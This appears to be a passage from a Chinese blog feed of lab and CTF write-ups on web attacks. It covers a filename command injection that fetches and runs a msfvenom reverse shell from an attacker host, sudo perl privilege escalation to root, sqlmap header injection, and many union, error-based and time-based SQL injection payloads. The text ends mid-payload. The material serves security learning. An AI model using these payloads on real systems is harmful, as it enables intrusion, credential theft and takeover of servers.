src="https://img-blog.csdnimg.cn/20200815000541247.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"></p><h2 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h2><p>找到一个上传页面，而且经过测试只能上传后缀为csv的文件，所以在桌面新建一个<code>1.csv</code>然后使用burpsuite进行抓包修改参数，写入可执行的命令在名称里面。<br>启动监听，使用msfconsole</p><pre class="language-bash" data-language="bash"><code class="language-bash">msfconsoleuse exploit/multi/handler <span class="token builtin class-name">set</span> payload linux/x86/meterpreter_reverse_tcp<span class="token builtin class-name">set</span> lhost <span class="token number">10.0</span>.2.4exploit<span class="token comment">#开启监听</span></code></pre><p>然后制作shell；</p><pre class="language-bash" data-language="bash"><code class="language-bash">msfvenom -p linux/x86/meterpreter_reverse_tcp <span class="token assign-left variable">lhost</span><span class="token operator">=</span><span class="token number">10.0</span>.2.4 <span class="token assign-left variable">lport</span><span class="token operator">=</span><span class="token number">4444</span> -f elf <span class="token operator">></span> /var/www/html/shell</code></pre><p>然后就是绕过防火墙 上传shell<br>利用base64绕过防火墙检测</p><pre class="language-php" data-language="php"><code class="language-php">service apache2 start<span class="token shell-comment comment">#开启apache服务</span><span class="token keyword">echo</span> <span class="token single-quoted-string string">'wget http://10.0.2.4/shell -O /tmp/shell'</span> <span class="token operator">|</span> base64<span class="token keyword">echo</span> <span class="token single-quoted-string string">'chmod +x /tmp/shell'</span> <span class="token operator">|</span> base64<span class="token keyword">echo</span> <span class="token single-quoted-string string">'/tmp/shell'</span> <span class="token operator">|</span> base64</code></pre><p>使用burpsuite抓包修改参数</p><pre class="language-php" data-language="php"><code class="language-php">"<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> shell <span class="token function">system</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'base64encodestrings'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>.php"</code></pre><p>一步一步的将参数修改上传，最后得到反弹的shell，<br>提升权限；<br>登录服务器后，反弹的shell是www-data用户，并不具备root权限，<br>使用<code>sudo -l</code> 查看www-data用户的sudo权限；<br>根据提示执行以下命令（为了方便，程序员便设置了不需要密码就可以执行的web操作）</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> perl -e <span class="token string">"exec '/bin/bash' "</span><span class="token function">bash</span> -i</code></pre><p>就得到了服务器的root用户权限。</p><h2 id="SQL注入-X-Forwarded-For报头注入"><a href="#SQL注入-X-Forwarded-For报头注入" class="headerlink" title="SQL注入-X-Forwarded-For报头注入"></a>SQL注入-X-Forwarded-For报头注入</h2><p>靶场是linux 2.6x的系统，安装虚拟机时注意。<br>然后对靶机进行信息收集，发现了敏感目录，访问是一个登录页面<br>尝试弱口令登录，但是失败了。<br><img src="https://img-blog.csdnimg.cn/20200815000739259.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"></p><p>放弃使用弱口令，开始进行漏洞扫描，使用AVWS进行漏洞扫描。<br><img src="https://img-blog.csdnimg.cn/2020081500075381.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>配置好，然后开始scan<br>等待结果就可以了<br><img src="https://img-blog.csdnimg.cn/20200815000808909.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"></p><p>最后这个有个高危漏洞，是个盲注。详细信息继续查看。<br>看出是关于X-Forwarded-For报头注入的一个SQL盲注漏洞。<br><img src="https://img-blog.csdnimg.cn/20200815000819696.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"></p><p> 使用sqlmap进行探测，就可以得到数据库中的数据了。</p><pre class="language-bash" data-language="bash"><code class="language-bash">sqlmap -u <span class="token string">"http://10.0.2.10"</span> --headers<span class="token operator">=</span><span class="token string">"X-Forwarded-For:*"</span> --dbs --batchsqlmap -u <span class="token string">"http://10.0.2.10"</span> --headers<span class="token operator">=</span><span class="token string">"X-Forwarded-For:*"</span> -D <span class="token string">"photoblog"</span> --tables --batchsqlmap -u <span class="token string">"http://10.0.2.10"</span> --headers<span class="token operator">=</span><span class="token string">"X-Forwarded-For:*"</span> -D <span class="token string">"photoblog"</span> -T <span class="token string">"users"</span> --columns --batchsqlmap -u <span class="token string">"http://10.0.2.10"</span> --headers<span class="token operator">=</span><span class="token string">"X-Forwarded-For:*"</span> -D <span class="token string">"photoblog"</span> -T <span class="token string">"users"</span> -C <span class="token string">"login,password"</span> --dump --batch</code></pre><p>按照套路来就行，最后测出数据<br><img src="https://img-blog.csdnimg.cn/20200815000835969.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"></p><p>账号密码进行登录<br>然后就是老套路，上传webshell，连接，提权等操作。</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF靶场系列 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入————整数型、报错型</title>
      <link href="/posts/462fd7a5/"/>
      <url>/posts/462fd7a5/</url>
      
        <content type="html"><![CDATA[<h2 id="整数型注入"><a href="#整数型注入" class="headerlink" title="整数型注入"></a>整数型注入</h2><p>在CTFhub上的一道整数型注入的题，刚接触SQL注入，这也是我第一次做整数型注入的题，做个记录。<br>开启环境：<br><img src="https://img-blog.csdnimg.cn/20200310214847879.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>先判断是否存在注入<br>payload：</p><pre class="language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200310215948213.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>payload：</p><pre class="language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200310215917833.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>证明存在注入，那就搞它！<br>输入1试试，有回显。<br><img src="https://img-blog.csdnimg.cn/20200310214905824.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>判断字段数 payload：</p><pre class="language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">1</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200310215241185.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>再输入2,3挨个试<br>payload：</p><pre class="language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">3</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200310215220476.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>发现这里报错了，所以判断字段数只有2<br>爆数据库：payload：</p><pre class="language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200310215327452.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>爆出数据库名为<code>sqli</code><br>爆表名：</p><pre class="language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token string">'sqli'</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200310215403271.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>爆出两个表，一个<code>news</code>一个<code>flag</code>很明显，flag就藏在这里了。<br>爆字段名：</p><pre class="language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token string">'flag'</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200310215728850.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>字段名还是<code>flag</code>最后一步爆值：<br>payload：</p><pre class="language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span class="token keyword">from</span> sqli<span class="token punctuation">.</span>flag</code></pre><p><img src="https://img-blog.csdnimg.cn/20200310215758262.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>flag出来了。get！！！</p><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>报错注入就是通过反馈出来的错误来获取到我们所需要的信息。<br><strong>updatexml报错注入</strong><br>这是我在网上了解到的一种报错注入方式。报错注入原来有好多种办法，这里主要解释这个updatexml报错注入，先介绍updatexml报错的原理：我是一个小白，也不懂什么是updataxml函数，网上查呗看了好几篇博客，也没搞明白updataxml函数，大家写的都一样，反正就是在脚本之家上找到了原版<br><img src="https://img-blog.csdnimg.cn/20200314180756881.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="来自脚本之家" loading="lazy"><br>Xpath 语法是要单独去学的，不过没必要，了解一下就行（我是了解都没了解，直接记的。🤣🤣🤣我懒，嫌麻烦。）<br>然后看到了示例的updataxml函数语句，我疑问更多了。<br>payload：</p><pre class="language-sql" data-language="sql"><code class="language-sql">id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token punctuation">(</span>updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>呐，我更疑惑了，一看这句，不知道有没有跟我内心活动相同的。（我<em>，0x7e又是什么？？？？上面还有好多没搞明白的，又来一个。****</em>直接口吐芬芳）<br><code>0x7e</code>我查的是在SQL中的报错什么的，我也不明白，有兴趣的可以百度看看。看的头懵。<br>updatexml第二个参数需要的是Xpath格式的字符串，但是我们第二个参数如果不是Xpath格式，而是我们想要获得的数据，那么它就会报错，并且在报错的时候会将错的内容显示出来，然后我们就可以获得我们想要的数据了。原理差不多就是这个。<br>算啦，实在搞不明白不搞了，直接用吧</p><h5 id="实战CTFhub的题"><a href="#实战CTFhub的题" class="headerlink" title="实战CTFhub的题"></a>实战CTFhub的题</h5><p>开启环境（熟门熟路，不知道开过几次了，看大佬的博客一看就会，一做就废。😥😥😥关键是这玩意而氪金）</p><p><img src="https://img-blog.csdnimg.cn/20200314170945191.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>那就输入1试试，查询正确了<br><img src="https://img-blog.csdnimg.cn/20200314171040711.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>之前没有做过报错的题，这是第一个！！！<br>该用到updatexml函数了payload：</p><pre class="language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token punctuation">(</span>updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><img src="https://img-blog.csdnimg.cn/2020031417125212.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>不出所料得到了我们想要的数据库名<code>sqli</code><br>继续payload：</p><pre class="language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token punctuation">(</span>updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token string">'sqli'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200314171356125.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>信息显示sqli下的两个表是<code>news</code>和<code>flag</code><br>payload：</p><pre class="language-sql" data-language="sql"><code class="language-sql">id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token punctuation">(</span>updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200314171606649.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>payload：</p><pre class="language-sql" data-language="sql"><code class="language-sql">id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token punctuation">(</span>updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span class="token keyword">from</span> flag<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200314171717106.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>查询出来flag了，不过好像不完整。有一个坑？？？？why。<br><img src="https://img-blog.csdnimg.cn/20200314183503358.jpg" alt="在这里插入图片描述" loading="lazy"><br>心态崩了啊。还要再查，查查查………………烦，不过还好找到了，<strong>xpath报错只显示32位结果</strong>然后要用到另一个函数mid。<strong>需要借助mid函数来进行字符截取从而显示32位以后的数据。</strong>找找mid函数的用法（因为大佬没有解释，只说了怎么用。）还是亲爱的度娘比较贴心。😭😭😭😭<br><img src="https://img-blog.csdnimg.cn/20200314184144714.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="来自百度百科" loading="lazy"><br>好嘞，这下就懂了。可以继续了，what？？环境到期了，😭😭😭又要花金币。赶紧的，不磨蹭了。<br>payload：</p><pre class="language-sql" data-language="sql"><code class="language-sql">id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token punctuation">(</span>updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token function">mid</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span class="token keyword">from</span> flag<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200314171847891.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>最后汇总flag：ctfhub{21129dbb7c5caaba20b91e9f8d3018104fe54fcd}<br>呼……真巴适哈哈哈。<img src="https://img-blog.csdnimg.cn/20200314184539198.gif" alt="在这里插入图片描述" loading="lazy"><br>最后再附上大佬博客<a href="https://www.cnblogs.com/wocalieshenmegui/p/5917967.html">十种MySQL报错注入</a><br>还有这个<a href="https://www.freebuf.com/column/150475.html">CTF中的SQL注入</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入————sqli-labs靶场闯关</title>
      <link href="/posts/b8ab61b7/"/>
      <url>/posts/b8ab61b7/</url>
      
        <content type="html"><![CDATA[<p>前言：SQL注入必须要拿下，所以继续学习并在靶场实验。有些关卡学习新的知识点，都在中间穿插着。比如18,19关等。</p><h2 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h2><p>判断闭合符号，输入一个反斜扛<code>\</code>来试试<br><img src="https://img-blog.csdnimg.cn/20200430103523785.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>可以看出是<code>&#39;)</code>闭合，然后开始注入<br>第一种、基于报错的注入<br>先抓包，然后send to repeater<br>构造SQL语句</p><pre class="language-sql" data-language="sql"><code class="language-sql">uname<span class="token operator">=</span>admin'<span class="token punctuation">)</span> <span class="token operator">and</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">--+&amp;passwd=admin&amp;submit=Submit</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200430230106332.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>这个报错语句是我刚学的，个人认为比较好记哈。<br>然后进行表的查询</p><pre class="language-sql" data-language="sql"><code class="language-sql">uname<span class="token operator">=</span>admin'<span class="token punctuation">)</span> <span class="token operator">and</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> table_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">limit</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">--+&amp;passwd=admin&amp;submit=Submit</span></code></pre><p>还是利用limit来控制查询的表。一步一步找到我们想要的<code>users</code>表<br><img src="https://img-blog.csdnimg.cn/20200430230241225.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p><p>其他的不再重复。参考第十一关。</p><h2 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h2><p>依旧是判断闭合符号，输入一个反斜扛，看到是双引号闭合。<br><img src="https://img-blog.csdnimg.cn/20200430105527383.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>其他没什么，就跟上一关一样了。<br>抓包，构造SQL语句</p><pre class="language-sql" data-language="sql"><code class="language-sql">uname<span class="token operator">=</span>admin" <span class="token operator">and</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">--+&amp;passwd=admin&amp;submit=Submit</span></code></pre><p>不再重复。</p><h2 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h2><p>输入反斜扛进行判断，发现没有回显，考虑是时间型盲注。<br>先抓包，发送Repeater慢慢注。<br>先Go一下，发现加载页面加载了1秒左右，然后构造SQL语句</p><pre class="language-sql" data-language="sql"><code class="language-sql">uname<span class="token operator">=</span>admin' <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token comment">--+&amp;passwd=admin&amp;submit=Submit //登录成功了，可以说明是单引号闭合</span></code></pre><p>构造payload</p><pre class="language-sql" data-language="sql"><code class="language-sql">uname<span class="token operator">=</span>admin' <span class="token operator">and</span> sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span> <span class="token comment">--+&amp;passwd=admin&amp;submit=Submit</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200430230605158.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p><p>然后可以构造其他的语句来判断并爆出数据库名(一步一步来是真累)。<br>判断数据库名长度</p><pre class="language-sql" data-language="sql"><code class="language-sql">uname<span class="token operator">=</span>admin' <span class="token operator">and</span> <span class="token keyword">if</span><span class="token punctuation">(</span>length<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">8</span><span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">--+&amp;passwd=admin&amp;submit=Submit</span></code></pre><p>判断数据库名</p><pre class="language-sql" data-language="sql"><code class="language-sql">uname<span class="token operator">=</span>admin<span class="token string">' and if(left(database(),1)='</span>s'<span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token 